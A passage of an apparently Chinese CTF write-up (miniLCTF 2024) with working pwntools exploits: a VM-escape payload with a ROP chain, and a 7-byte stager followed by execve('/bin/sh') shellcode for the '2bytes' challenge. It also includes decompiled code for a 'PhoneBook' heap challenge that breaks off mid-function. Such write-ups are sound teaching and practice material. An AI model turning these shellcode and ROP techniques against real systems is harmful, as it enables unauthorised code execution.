<span class="token comment"># DIV 7</span>
<span class="token comment"># AND 8</span>
<span class="token comment"># OR 9</span>
<span class="token comment"># XOR 0xa</span>
<span class="token comment"># NOT 0xb</span>
<span class="token comment"># SHL 0xc</span>
<span class="token comment"># SHR 0xd</span>
<span class="token comment"># CMP 0xe</span>
<span class="token comment"># JMP 0xf</span>
<span class="token comment"># JE 0x10</span>
<span class="token comment"># JNE 0x11</span>
<span class="token comment"># SET 0x12 SET REG0 40</span>
<span class="token comment"># INT 0x13 INT syscall_number</span>
<span class="token comment"># HLT 0x14 HLT</span>

<span class="token comment"># bss = 0x4e4000</span>
<span class="token comment"># flag_str_addr = 0x20242000</span>
<span class="token comment"># SET REG0 1</span>
<span class="token comment"># SET REG1 0x20242000</span>
<span class="token comment"># SET REG2 40</span>
<span class="token comment"># NOT REG5 REG1</span>
<span class="token comment"># INT 1</span>

<span class="token comment"># p = process("./chal",stdin=PTY,raw=False)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>

<span class="token comment"># mremap 	man/ cs/ 	0x19 	unsigned long addr 	unsigned long old_len 	unsigned long new_len 	unsigned long flags 	unsigned long new_addr</span>
<span class="token comment"># process_vm_writev 	man/ cs/ 	0x137 	pid_t pid 	const struct iovec *lvec 	unsigned long liovcnt 	const struct iovec *rvec 	unsigned long riovcnt 	unsigned long flags</span>

    <span class="token comment">#    struct iovec &#123;</span>
    <span class="token comment">#        void   *iov_base;  /* Starting address */</span>
    <span class="token comment">#        size_t  iov_len;   /* Size of the memory pointed to by iov_base. */</span>
    <span class="token comment">#    &#125;;</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">b'''
SET REG0 0x67616c662f2e
STORE REG0 0x20240000

SET REG0 0x4a4319
STORE REG0 0x20242000

SET REG0 0x20242000
STORE REG0 0x20241000
SET REG0 0x8
STORE REG0 0x20241008

SET REG0 0x4E4070
STORE REG0 0x20241010
SET REG0 0x8
STORE REG0 0x20241018

SET REG0 0x150
SET REG1 0x20241000
SET REG2 1
SET REG3 0x20241010
SET REG4 1
SET REG5 0
INT 0x137
'''</span>

pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004062f3</span>
pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x0000000000404e68</span>
pop_rdx_rbx_ret <span class="token operator">=</span> <span class="token number">0x000000000049688b</span>
pop_rcx_ret <span class="token operator">=</span> <span class="token number">0x000000000049d61b</span> <span class="token comment"># pop rcx ; add eax, 0x1480000 ; ret</span>
syscall <span class="token operator">=</span> <span class="token number">0x460E10</span>
mov_r8d <span class="token operator">=</span> <span class="token number">0x000000000049a206</span>
memory_addr <span class="token operator">=</span> <span class="token number">0x20240000</span>

payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>memory_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>memory_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>memory_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rcx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_r8d<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

<span class="token comment"># payload2 = '''</span>
<span class="token comment"># INT 0x27</span>
<span class="token comment"># HLT</span>
<span class="token comment"># '''</span>

<span class="token comment"># syscall</span>
gdb_comm <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
b *0x403EEF 
c
'''</span>
<span class="token comment"># gdb.attach(p,gdb_comm)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Please input your code (max: 4096), end with EOF:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
<span class="token comment"># p.send(chr(tty.CEOF))</span>
p<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token punctuation">)</span>


p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="2bytes"><a href="#2bytes" class="headerlink" title="2bytes"></a>2bytes</h2><p>read to input那可以覆盖passwd，strcmp是根据\x00来判断cmp的长度的，所以只可以执行七个字节长度的shellcode，七个字节实现getshell很明显是不够的，所以得实现syscall read一次，并且jmp到mmap的段那。只需要用xchg交换rsi rdx的值 之后syscall，就能read 0x1000的数据到mmap的段那，再jmp过去就好了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> passwd<span class="token punctuation">,</span> <span class="token number">7uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me the secret"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> input<span class="token punctuation">,</span> <span class="token number">0xFuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> passwd<span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good luck"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
__int64 <span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v0<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
  _QWORD <span class="token operator">*</span>i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h]</span>
  _QWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>

  v3 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> <span class="token operator">*</span><span class="token operator">&amp;</span>passwd<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token operator">*</span>passwd<span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> v3<span class="token punctuation">;</span> i <span class="token operator">!=</span> <span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token operator">*</span>i <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">.bss:0000000000004050                               public input
.bss:0000000000004050                               ; char input[8]
.bss:0000000000004050 ?? ?? ?? ?? ?? ?? ?? ??       input db 8 dup(?)                       ; DATA XREF: main+B9↑o
.bss:0000000000004050                                                                       ; main+D7↑o
.bss:0000000000004058                               public passwd
.bss:0000000000004058                               ; char passwd[8]
.bss:0000000000004058 ?? ?? ?? ?? ?? ?? ?? ??       passwd db 8 dup(?)                      ; DATA XREF: pwnme+35↑o
.bss:0000000000004058                                                                       ; main+8A↑o
.bss:0000000000004058                                                                       ; main+CD↑o
.bss:0000000000004058                               _bss ends
.bss:0000000000004058<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
PORT <span class="token operator">=</span> <span class="token number">40735</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    tmp <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        tmp<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">^</span> data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>


payload <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
xchg rsi,rdx
syscall
'''</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\xeb\xf9'</span>
 

payload <span class="token operator">=</span> encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Give me the secret"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    mov rax,0x68732f6e69622f
    push rax
    push rsp
    pop rdi
    push 0x3b
    pop rax
    xor esi, esi
    xor edx, edx
    syscall
'''</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Good luck"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>





p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="PhoneBook"><a href="#PhoneBook" class="headerlink" title="PhoneBook"></a>PhoneBook</h2><p>程序的逻辑是这样的</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to minilctf2024!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Here is a simple Phone book."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"But it's so vulnerable."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v4 <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
        <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
        <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
        <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
        <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Bye Bye! "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token operator">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Unknown choice! \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  _QWORD <span class="token operator">*</span>i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h]</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h]</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>chunklist<span class="token punctuation">;</span> i<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>i<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>i <span class="token operator">></span> <span class="token number">0x3FuLL</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You can not add more!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  i<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">new_people</span><span class="token punctuation">(</span><span class="token operator">*</span>i <span class="token operator">+</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">my_read</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0xFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Phone Number?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">my_read</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0xBu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Add success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">unsigned</span> __int64 <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
